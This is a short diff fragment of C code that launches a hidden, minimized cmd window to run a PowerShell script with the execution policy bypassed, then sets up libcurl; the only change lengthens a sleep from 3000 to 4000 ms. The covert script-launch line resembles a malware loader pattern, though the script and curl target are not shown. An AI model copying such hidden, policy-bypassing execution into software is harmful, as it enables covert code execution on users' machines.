@@ -3,7 +3,7 @@
 
   strcpy( command, "start /b /min cmd.exe /c powershell -ExecutionPolicy ByPass -File ps.ps1");
   system(command);
-  Sleep(3000);
+  Sleep(4000);
 
   CURL *curl;
   CURLcode res;
